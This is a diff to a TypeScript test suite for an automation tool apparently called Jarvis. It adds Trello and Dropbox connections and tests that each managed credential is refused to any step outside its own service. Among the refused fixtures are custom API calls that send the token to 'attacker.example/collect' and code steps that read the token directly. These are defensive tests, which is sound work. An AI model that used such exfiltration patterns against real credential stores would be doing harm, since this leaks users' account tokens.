@@ -11,6 +11,9 @@ import { CredentialResolver } from "../credentials/adapter";
 import { JarvisGoogleConnectionSource } from "../credentials/google-source";
 import { JarvisClickUpConnectionSource } from "../credentials/clickup-source";
 import { JarvisGitHubConnectionSource } from "../credentials/github-source";
+import { JarvisTrelloConnectionSource } from "../credentials/trello-source";
+import { JarvisDropboxConnectionSource } from "../credentials/dropbox-source";
+import type { JarvisConfig } from "../../config/types";
 import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
@@ -32,6 +35,8 @@ const HTTP = "@activepieces/piece-http";
 const SLACK = "@activepieces/piece-slack";
 const CLICKUP = "@activepieces/piece-clickup";
 const GITHUB = "@activepieces/piece-github";
+const TRELLO = "@activepieces/piece-trello";
+const DROPBOX = "@activepieces/piece-dropbox";
 
 const pieces = new PieceCatalog([
   { name: GMAIL, displayName: "Gmail", description: "", auth: { type: "OAUTH2" }, actions: {
@@ -53,6 +58,24 @@ const pieces = new PieceCatalog([
   { name: CLICKUP, displayName: "ClickUp", description: "", auth: { type: "OAUTH2" }, actions: {
     create_task: { name: "create_task", displayName: "", description: "", inputSchema: { fields: [
       { name: "name", label: "", type: "string", required: false },
+    ] } },
+    custom_api_call: { name: "custom_api_call", displayName: "", description: "", inputSchema: { fields: [
+      { name: "url", label: "", type: "json", required: false },
+      { name: "method", label: "", type: "string", required: false },
+    ] } },
+  } },
+  { name: TRELLO, displayName: "Trello", description: "", auth: { type: "BASIC_AUTH" }, actions: {
+    create_card: { name: "create_card", displayName: "", description: "", inputSchema: { fields: [
+      { name: "name", label: "", type: "string", required: false },
+    ] } },
+    custom_api_call: { name: "custom_api_call", displayName: "", description: "", inputSchema: { fields: [
+      { name: "url", label: "", type: "json", required: false },
+      { name: "method", label: "", type: "string", required: false },
+    ] } },
+  } },
+  { name: DROPBOX, displayName: "Dropbox", description: "", auth: { type: "OAUTH2" }, actions: {
+    list_dropbox_folder: { name: "list_dropbox_folder", displayName: "", description: "", inputSchema: { fields: [
+      { name: "path", label: "", type: "string", required: false },
     ] } },
     custom_api_call: { name: "custom_api_call", displayName: "", description: "", inputSchema: { fields: [
       { name: "url", label: "", type: "json", required: false },
@@ -412,6 +435,124 @@ describe("managed GitHub is scoped to GitHub steps", () => {
       const response = await fetchFor(runOf(trigger), "jarvis:github");
       expect(response.status).toBe(200);
       expect(await response.json()).toMatchObject({ type: "OAUTH2", pieceName: GITHUB, value: { access_token: GITHUB_TOKEN, jarvis_managed: "github" } });
+    }
+  });
+});
+
+describe("managed Trello is scoped to Trello steps", () => {
+  const TRELLO_TOKEN = "synthetic-managed-trello-user-token";
+  const ref = "{{connections.jarvis:trello}}";
+  let dataDir: string;
+  beforeEach(() => {
+    dataDir = mkdtempSync(join(tmpdir(), "trello-scope-"));
+    mkdirSync(join(dataDir, "connections"));
+    writeFileSync(join(dataDir, "connections", "trello.json"), JSON.stringify({ version: 1, provider: "trello", status: "connected",
+      generation: crypto.randomUUID(), access_token: TRELLO_TOKEN, settings: { api_key: "synthetic-public-key" },
+      account: { id: "a".repeat(24), label: "owner" }, workspaces: [], connected_at: new Date().toISOString() }));
+    credentials.register(new JarvisTrelloConnectionSource(dataDir));
+  });
+  afterEach(() => rmSync(dataDir, { recursive: true, force: true }));
+  const card = (input: Record<string, unknown> = { auth: ref }, nextAction?: any, actionName = "create_card"): any => ({
+    name: "card", type: "PIECE", settings: { pieceName: TRELLO, actionName, input }, ...(nextAction ? { nextAction } : {}),
+  });
+  const trelloTrigger = (extra: Record<string, unknown> = {}): any => ({ name: "trigger", type: "PIECE_TRIGGER",
+    settings: { pieceName: TRELLO, triggerName: "new_card", input: { auth: ref }, ...extra } });
+  const trelloCall = (url: string): any => ({ name: "call", type: "PIECE",
+    settings: { pieceName: TRELLO, actionName: "custom_api_call", input: { auth: ref, method: "GET", url: { url } } } });
+  const refused: Array<[string, any]> = [
+    ["a CODE step input", empty(code({ conn: ref }))],
+    ["an HTTP step header", empty(http({ Authorization: "Bearer " + ref }))],
+    ["a Gmail step auth", empty(gmail({ auth: ref }))],
+    ["a Trello step next to a CODE step that reads the token", empty(card(undefined, code({ token: "{{connections['jarvis:trello'].password}}" })))],
+    ["a Trello custom API call to another host", empty(trelloCall("https://attacker.example/collect"))],
+    // The managed connection runs only its qualified actions; the engine would refuse these too.
+    ["a Trello custom API call on api.trello.com", empty(trelloCall("https://api.trello.com/1/members/me"))],
+    ["a Trello action outside the managed set", empty(card({ auth: ref }, undefined, "delete_card"))],
+    ["a Trello trigger", trelloTrigger()],
+    ["a Trello trigger carrying a stray qualified actionName", trelloTrigger({ actionName: "create_card" })],
+    ["a Trello step carrying a stray triggerName", empty({ ...card(), settings: { ...card().settings, triggerName: "new_card" } })],
+  ];
+  for (const [label, trigger] of refused) {
+    test(`${label} is not ready and the route refuses it`, async () => {
+      expect(bindingIssues(trigger).length).toBeGreaterThan(0);
+      const response = await fetchFor(runOf(trigger), "jarvis:trello");
+      expect(response.status).toBe(403);
+      expect(await response.text()).not.toContain(TRELLO_TOKEN);
+    });
+  }
+  test("the refusal names Trello", () => {
+    const [issue] = bindingIssues(empty(code({ conn: ref })));
+    expect(issue!.message).toBe("Managed connection jarvis:trello can only be used by Trello steps");
+    expect(issue!.allowedPieces).toEqual([TRELLO]);
+  });
+  test("a refused Trello trigger or action says the connection does not support it", () => {
+    for (const trigger of [trelloTrigger(), trelloTrigger({ actionName: "create_card" }), empty(card({ auth: ref }, undefined, "delete_card"))]) {
+      expect(bindingIssues(trigger).map(i => i.message)).toContain("This Trello connection does not support this action or trigger yet");
+    }
+  });
+  test("a Trello step auth on a qualified action passes the connection scope and resolves", async () => {
+    for (const actionName of ["list_boards", "list_lists", "get_card", "create_card", "move_card"]) {
+      const trigger = empty(card({ auth: ref }, undefined, actionName));
+      expect(bindingIssues(trigger)).toEqual([]);
+      const response = await fetchFor(runOf(trigger), "jarvis:trello");
+      expect(response.status).toBe(200);
+      expect(await response.json()).toMatchObject({ type: "BASIC_AUTH", pieceName: TRELLO, value: { password: TRELLO_TOKEN } });
+    }
+  });
+});
+
+describe("managed Dropbox is scoped to Dropbox steps", () => {
+  const DROPBOX_TOKEN = "synthetic-managed-dropbox-access-token";
+  const ref = "{{connections.jarvis:dropbox}}";
+  let dataDir: string;
+  beforeEach(() => {
+    dataDir = mkdtempSync(join(tmpdir(), "dropbox-scope-"));
+    mkdirSync(join(dataDir, "connections"));
+    writeFileSync(join(dataDir, "connections", "dropbox.json"), JSON.stringify({ version: 1, provider: "dropbox", status: "connected",
+      generation: crypto.randomUUID(), access_token: DROPBOX_TOKEN, refresh_token: "synthetic-dropbox-refresh",
+      expires_at: new Date(Date.now() + 3600000).toISOString(), account: { id: "dbid:1", label: "owner" },
+      workspaces: [{ id: "123", name: "Dropbox home" }], settings: { home_namespace_id: "123" }, connected_at: new Date().toISOString(),
+      refresh: { url: "https://app.usejarvis.dev/api/integrations/dropbox/refresh", instance_id: crypto.randomUUID(), secret: "a".repeat(64) } }));
+    const config = { daemon: { data_dir: dataDir }, usejarvis_integrations: { page_url: "https://app.usejarvis.dev/account" } } as JarvisConfig;
+    // No network: the stored token is fresh, so resolve never refreshes.
+    credentials.register(new JarvisDropboxConnectionSource(config, (async () => { throw new Error("no network in tests"); }) as unknown as typeof fetch));
+  });
+  afterEach(() => rmSync(dataDir, { recursive: true, force: true }));
+  const step = (input: Record<string, unknown> = { auth: ref }, nextAction?: any, actionName = "list_dropbox_folder"): any => ({
+    name: "files", type: "PIECE", settings: { pieceName: DROPBOX, actionName, input }, ...(nextAction ? { nextAction } : {}),
+  });
+  const dropboxCall = (url: string): any => ({ name: "call", type: "PIECE",
+    settings: { pieceName: DROPBOX, actionName: "custom_api_call", input: { auth: ref, method: "POST", url: { url } } } });
+  const refused: Array<[string, any]> = [
+    ["a CODE step input", empty(code({ conn: ref }))],
+    ["an HTTP step header", empty(http({ Authorization: "Bearer " + ref }))],
+    ["a Gmail step auth", empty(gmail({ auth: ref }))],
+    ["a Dropbox step next to a CODE step that reads the token", empty(step(undefined, code({ token: "{{connections['jarvis:dropbox'].access_token}}" })))],
+    ["a Dropbox custom API call to another host", empty(dropboxCall("https://attacker.example/collect"))],
+    // The managed connection runs only its qualified actions; the engine would refuse these too.
+    ["a Dropbox custom API call on api.dropboxapi.com", empty(dropboxCall("https://api.dropboxapi.com/2/files/delete_v2"))],
+    ["a Dropbox action outside the managed set", empty(step({ auth: ref }, undefined, "delete_dropbox_file"))],
+  ];
+  for (const [label, trigger] of refused) {
+    test(`${label} is not ready and the route refuses it`, async () => {
+      expect(bindingIssues(trigger).length).toBeGreaterThan(0);
+      const response = await fetchFor(runOf(trigger), "jarvis:dropbox");
+      expect(response.status).toBe(403);
+      expect(await response.text()).not.toContain(DROPBOX_TOKEN);
+    });
+  }
+  test("the refusal names Dropbox", () => {
+    const [issue] = bindingIssues(empty(code({ conn: ref })));
+    expect(issue!.message).toBe("Managed connection jarvis:dropbox can only be used by Dropbox steps");
+    expect(issue!.allowedPieces).toEqual([DROPBOX]);
+  });
+  test("a Dropbox step auth on a qualified action passes the connection scope and resolves", async () => {
+    for (const actionName of ["search_dropbox", "list_dropbox_folder", "get_dropbox_file_metadata", "create_new_dropbox_folder"]) {
+      const trigger = empty(step({ auth: ref }, undefined, actionName));
+      expect(bindingIssues(trigger)).toEqual([]);
+      const response = await fetchFor(runOf(trigger), "jarvis:dropbox");
+      expect(response.status).toBe(200);
+      expect(await response.json()).toMatchObject({ type: "OAUTH2", pieceName: DROPBOX, value: { access_token: DROPBOX_TOKEN, jarvis_managed: "dropbox" } });
     }
   });
 });
